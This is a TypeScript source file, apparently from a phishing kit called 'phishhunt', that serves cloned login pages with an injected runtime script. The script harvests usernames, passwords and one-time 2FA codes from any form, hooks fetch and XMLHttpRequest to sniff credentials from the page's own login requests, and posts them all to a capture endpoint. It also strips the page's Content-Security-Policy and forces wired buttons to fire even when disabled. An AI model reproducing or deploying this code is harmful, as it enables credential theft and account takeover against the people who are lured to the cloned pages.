// ────────────────────────────────────────────────────────────────
// Server-side assembly for the public /build pages.
// Reads the saved visual flow (nodes + connections) and serves the
// right page node's HTML with a runtime script that wires button
// clicks to Capture / New Page / URL / locked behaviour.
// ────────────────────────────────────────────────────────────────

export interface FlowNode {
  id: string;
  type: string;
  x: number;
  y: number;
  width: number;
  height: number;
  data?: Record<string, any>;
}

export interface FlowConnection {
  id: string;
  sourceNodeId: string;
  sourceButtonSelector: string; // "" = node-level connection
  targetNodeId: string;
  label?: string;
  // Dynamic Fetching (DF) — input field → text/input element on another page.
  // DF connections carry no "action": they are pure value piping.
  type?: "df";
  sourceSelector?: string; // input field on the source page
  targetSelector?: string; // text/input element on the target page
}

const CAPTURE_SCRIPT_RE = /<script data-phishhunt="capture">[\s\S]*?<\/script>/gi;
// Some cloned templates ship a restrictive <meta> Content-Security-Policy that
// blocks connect-src (kill /captures/submit) while still allowing inline
// scripts. Strip it so capture always works regardless of the page's own CSP.
const CSP_META_RE = /<meta\s+http-equiv\s*=\s*["']?content-security-policy["']?[^>]*>/gi;

export function stripCaptureScript(html: string): string {
  return html.replace(CAPTURE_SCRIPT_RE, "");
}

export function stripPageCsp(html: string): string {
  return html.replace(CSP_META_RE, "");
}

export function slugify(s: string): string {
  return (
    (s || "page")
      .toLowerCase()
      .replace(/[^a-z0-9]+/g, "-")
      .replace(/^-+|-+$/g, "")
      .slice(0, 60) || "page"
  );
}

// The page a visitor lands on: a preview/new_page node with no incoming
// node-level connection (pages are chained left-to-right into it).
export function computeEntry(
  nodes: FlowNode[],
  connections: FlowConnection[]
): FlowNode | null {
  const pageNodes = nodes.filter((n) => n.type === "preview" || n.type === "new_page");
  if (pageNodes.length === 0) return null;
  const incoming = new Set<string>();
  connections.forEach((c) => {
    if (c.type === "df") return; // DF value pipes are NOT page-chaining links
    if (!c.sourceButtonSelector) incoming.add(c.targetNodeId);
  });
  return (
    pageNodes.filter((n) => !incoming.has(n.id)).sort((a, b) => a.x - b.x)[0] ||
    pageNodes.find((n) => n.type === "preview") ||
    pageNodes[0]
  );
}

// Does this flow change victim-facing behaviour?
export function hasFlowWiring(nodes: FlowNode[], connections: FlowConnection[]): boolean {
  if (nodes.some((n) => n.type === "new_page")) return true;
  if (connections.some((c) => c.sourceButtonSelector)) return true;
  if (connections.some((c) => c.type === "df")) return true;
  if (
    nodes.some(
      (n) => n.data?.buttonStates && Object.keys(n.data.buttonStates).length > 0
    )
  ) {
    return true;
  }
  if (nodes.some((n) => n.data?.dfMarks && Object.keys(n.data.dfMarks).length > 0)) {
    return true;
  }
  return false;
}

export function flowNodeHtml(node: FlowNode, pageHtml: string): string {
  if (node.type === "preview") return pageHtml;
  if (node.type === "new_page") return (node.data?.htmlContent as string) || "";
  return "";
}

// Collision-safe page slug: unique per node even when labels collide (e.g. several
// new_page nodes all labeled "login"). Deterministic so the builder and the
// [slug] resolver always agree. Falls back to the plain label slug for backward
// compatibility when the label is unambiguous.
export function pageSlug(nodes: FlowNode[], node: FlowNode): string {
  const base = slugify(node.data?.label || node.id);
  const cls = slugify(node.id);
  const clash = nodes.some(
    (n) =>
      n.id !== node.id &&
      (n.type === "preview" || n.type === "new_page") &&
      slugify(n.data?.label || n.id) === base
  );
  return clash ? `${base}-${cls}` : base;
}

function routeFor(
  pageId: number,
  entry: FlowNode | null,
  nodes: FlowNode[],
  node: FlowNode
): string {
  if (entry && node.id === entry.id) return `/build/${pageId}`;
  return `/build/${pageId}/${pageSlug(nodes, node)}`;
}

export interface FlowButton {
  label?: string;
  actions: { type: "capture" | "new_page" | "link" | "url" | "do_nothing"; href?: string }[];
}

export interface FlowConfig {
  pageId: number;
  buttons: Record<string, FlowButton>;
  locked: Record<string, boolean>;
  df?: DfFlowConfig;
}

export interface DfLink {
  id: string;
  targetNodeId: string;
  targetSelector: string;
}

export interface DfFlowConfig {
  nodeId: string;
  sources: Record<string, DfLink[]>;
  targets: { selector: string }[];
  defaults: Record<string, string>;
}

function buildRuntimeScript(config: FlowConfig): string {
  const json = JSON.stringify(config);
  return `<script data-phishhunt="flow">
(function() {
  var CONFIG = ${json};
  var CLICK_SEL = 'button, input[type="submit"], input[type="button"], [role="button"], a[href], .btn, [onclick]:not(input):not(select), [aria-label*="log in" i], [aria-label*="sign in" i], [aria-label*="signin" i], [data-testid*="login" i], [data-testid*="signin" i]';
  var INTERNAL_RE = /\\/captures\\/submit/;
  var RECENT = {};
  function getSelector(el) {
    if (el.id) return '#' + el.id;
    var path = [];
    while (el && el.nodeType === 1) {
      var sel = el.tagName.toLowerCase();
      if (el.id) { path.unshift('#' + el.id); break; }
      var parent = el.parentElement;
      if (!parent) break;
      var same = [];
      var kids = Array.prototype.slice.call(parent.children);
      for (var k = 0; k < kids.length; k++) {
        if (kids[k].tagName === el.tagName) same.push(kids[k]);
      }
      var idx = same.indexOf(el) + 1;
      sel += ':nth-of-type(' + idx + ')';
      path.unshift(sel);
      el = parent;
    }
    return path.join(' > ');
  }
  function findButton(el) {
    if (!el || !el.closest) return null;
    return el.closest(CLICK_SEL);
  }
  // Universal credential reader: finds the username/email, password, and any
  // second-step code (OTP) no matter how the page names or types them. It
  // honours type=email/password/tel/number first, then hints from
  // id/name/placeholder/aria-label/class/title, then falls back to "the first
  // filled text field". Hidden and non-input control types are skipped.
  function readFields(root) {
    var email = '', password = '', username = '', otp = '', hasPass = false, any = false;
    var bag = [];
    var scope = (root && root.querySelectorAll) ? root : document;
    var els = scope.querySelectorAll('input, textarea');
    for (var i = 0; i < els.length; i++) {
      var el = els[i];
      if (!el) continue;
      var tag = el.tagName.toLowerCase();
      var type = String(el.type || (tag === 'textarea' ? 'textarea' : 'text')).toLowerCase();
      if (type === 'hidden' || type === 'checkbox' || type === 'radio' || type === 'submit' ||
          type === 'button' || type === 'image' || type === 'reset' || type === 'file' ||
          type === 'color' || type === 'range') continue;
      var val = String(el.value != null ? el.value : '').trim();
      var hints = String((el.id || '') + ' ' + (el.name || '') + ' ' + (el.placeholder || ' ') + ' ' +
        (el.getAttribute('aria-label') || ' ') + ' ' + (el.className || ' ') + ' ' + (el.title || ' ')).toLowerCase();
      if (type === 'password' || (/(\\bpass|\\bpwd|password)/.test(hints) && !/username/.test(hints))) {
        if (val) { hasPass = true; any = true; if (!password) password = val; }
        continue;
      }
      var isOtp = /otp|one[- ]?time|2fa|two[- ]?factor|security code|authentication code|verification|verify|pin|token/.test(hints);
      if (isOtp && type !== 'email') {
        if (val && !otp) { otp = val; any = true; }
        continue;
      }
      if (!val) continue;
      var score = 0;
      if (type === 'email') score = 4;
      else if (type === 'tel' || type === 'number' || /phone|mobile|number/.test(hints)) score = 3;
      else if (/user|email|mail|login|account|identifier|handle|username/.test(hints)) score = 2;
      else if (/name/.test(hints)) score = 1;
      if (/^[^@\\s]+@[^@\\s]+$/.test(val)) score = Math.max(score, 3);
      bag.push({ val: val, score: score, el: el });
      any = true;
    }
    // No typed or hinted password field found: for plain two-field pages the
    // password input often has no distinguishing attributes at all, so fall
    // back to the LAST filled text-ish field (the password conventionally
    // comes after the identifier).
    if (!hasPass && bag.length >= 2) {
      var last = bag[bag.length - 1];
      password = last.val;
      hasPass = true;
      bag.pop();
    }
    bag.sort(function(a, b) { return b.score - a.score; });
    if (bag.length) email = bag[0].val;
    username = email;
    return { email: email, username: username, password: password, otp: otp, hasPass: hasPass, any: any };
  }
  function sendCapture(info) {
    if (!info || !info.any) return;
    var data = { page_id: String(CONFIG.pageId), event: 'flow_capture' };
    if (info.email) data.email = info.email;
    else if (info.username) data.username = info.username;
    if (info.password) data.password = info.password;
    data.password_entered = String(Boolean(info.hasPass));
    if (info.otp) data.otp = info.otp;
    var fp = (data.email || '') + '|' + (data.password || '') + '|' + (data.otp || '') + '|' + String(data.password_entered);
    if (RECENT['__cap__' + fp]) return;
    RECENT['__cap__' + fp] = 1;
    var body = Object.keys(data).map(function(k) {
      return encodeURIComponent(k) + '=' + encodeURIComponent(data[k] || '');
    }).join('&');
    var url = (window.location.origin || '') + '/captures/submit';
    try {
      var x = new XMLHttpRequest();
      x.open('POST', url, true);
      x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      x.send(body);
    } catch (e) {
      try { if (navigator.sendBeacon) navigator.sendBeacon(url, body); } catch (e2) {}
    }
  }
  // ── Dynamic Fetching (DF) runtime ──────────────────────────────
  function setElValue(el, v) {
    try {
      var tag = el ? String(el.tagName || '').toLowerCase() : '';
      if (tag === 'input' || tag === 'textarea' || tag === 'select') {
        try { if (el.disabled) el.removeAttribute('disabled'); } catch (err) {}
        if (el.value === v) {
          try { el.dispatchEvent(new Event('input', { bubbles: true })); } catch (err) {}
          return;
        }
        el.value = v;
        try { el.dispatchEvent(new Event('input', { bubbles: true })); } catch (err) {}
        try { el.dispatchEvent(new Event('change', { bubbles: true })); } catch (err) {}
      } else if (el) {
        var cur = el.textContent != null ? String(el.textContent) : '';
        if (cur === v) return;
        el.textContent = v;
      }
    } catch (err) {}
  }
  function applyDf() {
    try {
      if (!CONFIG.df || !document.querySelector) return;
      var d = CONFIG.df;
      Object.keys(d.defaults || {}).forEach(function(sel) {
        var el = document.querySelector(sel);
        if (el) setElValue(el, d.defaults[sel]);
      });
      if (!window.sessionStorage) return;
      (d.targets || []).forEach(function(t) {
        var key = 'PH_DF::' + d.nodeId + '::' + t.selector;
        var stored = window.sessionStorage.getItem(key) || '';
        if (!stored) return;
        var el = document.querySelector(t.selector);
        if (el) setElValue(el, stored);
      });
    } catch (err) {}
  }
  function storeDf() {
    try {
      if (!CONFIG.df || !window.sessionStorage || !document.querySelector) return;
      var srcs = CONFIG.df.sources || {};
      Object.keys(srcs).forEach(function(sel) {
        var el = document.querySelector(sel);
        if (!el || el.value == null) return;
        var val = String(el.value);
        (srcs[sel] || []).forEach(function(link) {
          window.sessionStorage.setItem('PH_DF::' + link.targetNodeId + '::' + link.targetSelector, val);
        });
      });
    } catch (err) {}
  }
  window.__PH_DF_STORE__ = storeDf;
  // ── End DF ──────────────────────────────────────────────────────
  function runActions(actions, sel, scope) {
    var now = Date.now();
    if (sel && RECENT['run_' + sel] && now - RECENT['run_' + sel] < 900) return;
    if (sel) RECENT['run_' + sel] = now;
    actions.forEach(function(a) {
      if (a.type === 'capture') sendCapture(readFields(scope));
      else if ((a.type === 'new_page' || a.type === 'link') && a.href) {
        setTimeout(function() {
          // Persist DF values (typed email/username/phone) before leaving.
          try { if (window.__PH_DF_STORE__) window.__PH_DF_STORE__(); } catch (err) {}
          window.location.assign(a.href);
        }, 250);
      } else if (a.type === 'url' && a.href) {
        try {
          var win = window.open(a.href, '_blank', 'noopener');
          if (!win) {
            var anc = document.createElement('a');
            anc.href = a.href; anc.target = '_blank'; anc.rel = 'noopener';
            document.body.appendChild(anc); anc.click(); document.body.removeChild(anc);
          }
        } catch (err) {}
      }
    });
  }
  function isLoginControl(el, form) {
    if (!el) return false;
    var tag = String(el.tagName || "").toLowerCase();
    var key = String((el.id || "") + " " + (el.className || "") + " " + (el.textContent || "") + " " +
                    (el.getAttribute && (el.getAttribute("aria-label") || " "))).toLowerCase();
    if (/log\\s*in|sign\\s*in|login|submit|signin|continue|next|verify|auth/.test(key)) return true;
    if (tag === "input" && /submit|button/.test(String(el.type || "").toLowerCase())) return true;
    if (form && (tag === "button" || tag === "a" || (tag === "input" && String(el.type || "").toLowerCase() === "submit"))) {
        var defs = form.querySelectorAll('input[type="submit"], button[type="submit"], button:not([type])');
        for (var i = 0; i < defs.length; i++) if (defs[i] === el) return true;
    }
    return false;
  }
  function resolveWiredButton(btn, sel, scope) {
    if (CONFIG.buttons[sel]) return { sel: sel, cfg: CONFIG.buttons[sel] };
    var keys = Object.keys(CONFIG.buttons);
    if (keys.length === 0) return null;
    var btnText = (btn && btn.textContent ? btn.textContent.trim() : (btn && btn.value ? btn.value.trim() : '')).toLowerCase();
    for (var i = 0; i < keys.length; i++) {
      var lbl = (CONFIG.buttons[keys[i]].label || '').toLowerCase();
      if (lbl && btnText && (lbl === btnText || btnText.indexOf(lbl) >= 0 || lbl.indexOf(btnText) >= 0)) {
        return { sel: keys[i], cfg: CONFIG.buttons[keys[i]] };
      }
    }
    if (isLoginControl(btn, scope)) {
      return { sel: keys[0], cfg: CONFIG.buttons[keys[0]] };
    }
    return null;
  }
  // Clicks: wired buttons ALWAYS run their assigned actions (preventDefault +
  // stopImmediatePropagation so the page can never override/navigate on its
  // own). Clicking any other control while credentials are filled still
  // captures them passively.
  function isDisabled(el) {
    if (!el) return false;
    return el.disabled === true || el.hasAttribute('disabled') || el.getAttribute('aria-disabled') === 'true';
  }
  document.addEventListener('click', function(e) {
    var btn = findButton(e.target);
    if (!btn) return;
    var sel = getSelector(btn);
    // A disabled control is a hard gate: neither the page's handlers nor our
    // wired actions may run on it (native clicks are suppressed by browsers,
    // this also stops scripted/synthetic dispatches from triggering them).
    // Exception: a control EXACTLY wired in this flow (CONFIG.buttons[sel])
    // must run its assigned actions even when the template keeps re-disabling
    // it (e.g. Instagram's login re-disables on every keystroke/input event),
    // otherwise the unlocked-then-clicked button would "do nothing".
    var _exact = CONFIG.buttons[sel];
    if (!_exact && isDisabled(btn)) {
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      return;
    }
    if (CONFIG.locked[sel]) {
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      return;
    }
    var scope = (btn.closest && btn.closest('form')) || document;
    var res = resolveWiredButton(btn, sel, scope);
    if (res) {
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      runActions(res.cfg.actions, res.sel, scope);
    } else {
      var d = readFields(scope);
      if (d.hasPass) sendCapture(d);
    }
  }, true);
  // Form submissions (covers Enter-key logins, programmatic submit(), and
  // submit buttons): capture whatever was entered and force the wired action.
  document.addEventListener('submit', function(e) {
    var form = e.target;
    if (!form || form.tagName !== 'FORM') return;
    var d = readFields(form);
    if (!d.any) return;
    e.preventDefault();
    e.stopPropagation();
    e.stopImmediatePropagation();
    var submitter = typeof e.submitter !== 'undefined' ? e.submitter : null;
    var submitterExactWired = submitter && submitter.nodeType === 1 &&
      findButton(submitter) && !!CONFIG.buttons[getSelector(submitter)];
    if (submitter && submitter.nodeType === 1 && isDisabled(submitter) && !submitterExactWired) {
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      return;
    }
    var sel = null, cfg = null;
    if (submitter && submitter.nodeType === 1 && findButton(submitter)) {
      sel = getSelector(submitter);
      var res = resolveWiredButton(submitter, sel, form);
      if (res) { sel = res.sel; cfg = res.cfg; }
    }
    if (!cfg) {
      var keys = Object.keys(CONFIG.buttons);
      if (keys.length > 0) {
        sel = keys[0];
        cfg = CONFIG.buttons[keys[0]];
      }
    }
    if (cfg) runActions(cfg.actions, sel, form);
    else sendCapture(d);
  }, true);
  // Network sniffing: if the page authenticates via fetch()/XHR, upload the
  // credentials that were actually sent. Our own /captures/submit calls are
  // ignored so the loop never self-triggers.
  function parseBody(body) {
    var info = { email: '', password: '', otp: '', hasPass: false, any: false };
    var pairs = [];
    try {
      if (typeof FormData !== 'undefined' && body instanceof FormData) body.forEach(function(v, k) { pairs.push([k, v]); });
      else if (typeof URLSearchParams !== 'undefined' && body instanceof URLSearchParams) body.forEach(function(v, k) { pairs.push([k, v]); });
      else if (typeof body === 'string') {
        var s = String(body);
        if (s.charAt(0) === '{') {
          var o = JSON.parse(s);
          Object.keys(o).forEach(function(k) { pairs.push([k, String(o[k])]); });
        } else {
          s.split('&').forEach(function(p) {
            var eq = p.indexOf('=');
            if (eq < 0) pairs.push([p, '']);
            else try { pairs.push([decodeURIComponent(p.slice(0, eq).replace(/\\+/g, ' ')), decodeURIComponent(p.slice(eq + 1).replace(/\\+/g, ' '))]); } catch (err) {}
          });
        }
      }
    } catch (err) { return info; }
    pairs.forEach(function(pair) {
      var k = String(pair[0] || '').toLowerCase();
      var v = String(pair[1] == null ? '' : pair[1]).trim();
      if (!v) return;
      if (/pass|pwd/.test(k)) { info.hasPass = true; if (!info.password) info.password = v; }
      else if (/user|email|mail|login|account|identifier|handle|username/.test(k)) { if (!info.email) info.email = v; }
      else if (/otp|code|token|pin|phone|2fa/.test(k)) { if (!info.otp) info.otp = v; }
    });
    info.any = Boolean(info.email || info.password || info.otp || info.hasPass);
    if (info.any) sendCapture(info);
  }
  function sniffUrl(url, body) {
    try {
      if (!INTERNAL_RE.test(String(url || ''))) parseBody(body);
    } catch (err) {}
  }
  (function() {
    if (window.fetch) {
      var origFetch = window.fetch.bind(window);
      window.fetch = function(input, init) {
        try {
          var url = '', method = 'GET', body = null;
          if (typeof input === 'string') {
            url = input;
            method = String((init && init.method) || 'GET').toUpperCase();
            body = init && init.body != null ? init.body : null;
          } else if (input && typeof input === 'object') {
            url = input.url || '';
            method = String((input.method || (init && init.method) || 'GET')).toUpperCase();
            body = init && init.body != null ? init.body : null;
          }
          if ((method === 'POST' || method === 'PUT') && body != null) sniffUrl(url, body);
        } catch (err) {}
        return origFetch(input, init);
      };
    }
    var origOpen = XMLHttpRequest.prototype.open;
    var origSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open = function(method, url) {
      try { this.__phMuMethod = String(method || '').toUpperCase(); this.__phMuUrl = String(url || ''); } catch (err) {}
      return origOpen.apply(this, arguments);
    };
    XMLHttpRequest.prototype.send = function(body) {
      try {
        if (body != null && (this.__phMuMethod === 'POST' || this.__phMuMethod === 'PUT')) {
          sniffUrl(this.__phMuUrl || '', body);
        }
      } catch (err) {}
      return origSend.apply(this, arguments);
    };
  })();
  // DF boot: apply saved default text edits + sessionStorage-carried values once
  // the page is parseable, and re-apply if the page's own scripts rewrite them.
  (function() {
    if (!CONFIG.df) return;
    function boot() { try { applyDf(); } catch (err) {} }
    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', boot);
    else boot();
    window.addEventListener('load', function() { setTimeout(boot, 80); });
    try {
      if (window.MutationObserver) {
        var moTimer = null;
        var mo = new MutationObserver(function() {
          if (moTimer) return;
          moTimer = setTimeout(function() { moTimer = null; boot(); }, 150);
        });
        function watch() {
          if (document.body) mo.observe(document.body, { childList: true, subtree: true, characterData: true });
        }
        if (document.body) watch();
        else document.addEventListener('DOMContentLoaded', watch);
      }
    } catch (err) {}
  })();
  // Wired-button boot: templates sometimes serve a wired control with
  // disabled=""/aria-disabled (e.g. Instagram's login button is disabled until
  // the page's own JS enables it). A disabled control is a hard gate in the
  // click handler, so our wired action would never fire on it. Re-enable any
  // control that has a configured action, mirroring the DF re-enable in
  // setElValue, and re-apply whenever the page's own scripts disable it again.
  (function() {
    var WIRED_TAGS = { BUTTON: 1, A: 1, INPUT: 1 };
    function enableWired() {
      try {
        Object.keys(CONFIG.buttons).forEach(function(sel) {
          var cfg = CONFIG.buttons[sel];
          if (!cfg || !cfg.actions || cfg.actions.length === 0) return;
          var el = document.querySelector(sel);
          if (!el || !WIRED_TAGS[String(el.tagName || '').toUpperCase()]) return;
          try {
            el.disabled = false;
            if (el.hasAttribute('disabled')) el.removeAttribute('disabled');
            if (el.getAttribute('aria-disabled') === 'true') el.setAttribute('aria-disabled', 'false');
          } catch (err) {}
        });
      } catch (err) {}
    }
    if (Object.keys(CONFIG.buttons).length === 0) return;
    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', enableWired);
    else enableWired();
    try {
      if (window.MutationObserver) {
        var moTimer2 = null;
        var mo2 = new MutationObserver(function() {
          if (moTimer2) return;
          moTimer2 = setTimeout(function() { moTimer2 = null; enableWired(); }, 150);
        });
        function watch2() {
          if (document.body) mo2.observe(document.body, { childList: true, subtree: true });
        }
        if (document.body) watch2();
        else document.addEventListener('DOMContentLoaded', watch2);
      }
    } catch (err) {}
  })();
})();
<\/script>`;
}

// Serve a specific page node's HTML with flow wiring. When the flow has no
// wiring, returns the original page HTML untouched (backwards compatible).
export function flowPageAssembly(options: {
  pageId: number;
  pageHtml: string;
  nodes: FlowNode[];
  connections: FlowConnection[];
  node: FlowNode | null;
  entryNode: FlowNode | null;
}): string {
  const { pageId, pageHtml, nodes, connections, node, entryNode } = options;

  if (!hasFlowWiring(nodes, connections)) {
    return pageHtml;
  }

  // No resolvable node → serve the bare page with capture stripped (flow
  // pages never run the old auto-capture).
  if (!node) {
    return stripCaptureScript(pageHtml);
  }

  const html = flowNodeHtml(node, pageHtml);
  if (!html) {
    return stripCaptureScript(pageHtml);
  }

  const routeCache = new Map<string, string>();
  const getRoute = (target: FlowNode) => {
    let route = routeCache.get(target.id);
    if (!route) {
      route = routeFor(pageId, entryNode, nodes, target);
      routeCache.set(target.id, route);
    }
    return route;
  };

  const buttons: Record<string, FlowButton> = {};
  connections
    .filter((c) => c.sourceNodeId === node.id && c.sourceButtonSelector)
    .forEach((c) => {
      const tgt = nodes.find((t) => t.id === c.targetNodeId);
      if (!tgt) return;
      const entry = buttons[c.sourceButtonSelector] || (buttons[c.sourceButtonSelector] = { actions: [] });
      if (!entry.label && c.label) entry.label = c.label;
      if (tgt.type === "capture") {
        entry.actions.push({ type: "capture" });
      } else if (tgt.type === "new_page" || tgt.type === "preview") {
        entry.actions.push({ type: "link", href: getRoute(tgt) });
      } else if (tgt.type === "url") {
        entry.actions.push({ type: "url", href: (tgt.data?.url as string) || "#" });
      } else {
        entry.actions.push({ type: "do_nothing" });
      }
    });

  const states = (node.data?.buttonStates as Record<string, string> | undefined) || {};
  const locked: Record<string, boolean> = {};
  Object.entries(states).forEach(([sel, s]) => {
    if (s === "locked") locked[sel] = true;
  });

  // ── Dynamic Fetching (DF) wiring for this page node ──
  const dfConns = connections.filter((c) => c.type === "df");
  let df: DfFlowConfig | undefined;
  if (dfConns.length > 0) {
    const sources: Record<string, DfLink[]> = {};
    dfConns
      .filter((c) => c.sourceNodeId === node.id && c.sourceSelector)
      .forEach((c) => {
        (sources[c.sourceSelector!] = sources[c.sourceSelector!] || []).push({
          id: c.id,
          targetNodeId: c.targetNodeId,
          targetSelector: c.targetSelector || "",
        });
      });
    const targets = dfConns
      .filter((c) => c.targetNodeId === node.id && c.targetSelector)
      .map((c) => ({ selector: c.targetSelector as string }));
    const defaults: Record<string, string> = {};
    const marks =
      (node.data?.dfMarks as
        | Record<string, { kind: string; value?: string }>
        | undefined) || {};
    Object.entries(marks).forEach(([sel, mk]) => {
      if (mk?.kind === "text" && typeof mk.value === "string") defaults[sel] = mk.value;
    });
    if (Object.keys(sources).length > 0 || targets.length > 0 || Object.keys(defaults).length > 0) {
      df = { nodeId: node.id, sources, targets, defaults };
    }
  }

  const config: FlowConfig = { pageId, buttons, locked, ...(df ? { df } : {}) };
  const script = buildRuntimeScript(config);
  const injected = stripPageCsp(stripCaptureScript(html));
  // Inject at the very top of <head> so this runtime registers its capture-phase
  // document listeners before any page script — the page can never swallow our
  // click/submit handling with its own stopImmediatePropagation.
  if (/<head[^>]*>/i.test(injected)) {
    return injected.replace(/<head[^>]*>/i, (m) => `${m}${script}`);
  }
  if (/<html[^>]*>/i.test(injected)) {
    return injected.replace(/<html[^>]*>/i, (m) => `${m}${script}`);
  }
  if (/<\/body>/i.test(injected)) {
    return injected.replace(/<\/body>/i, script + "</body>");
  }
  return injected + script;
}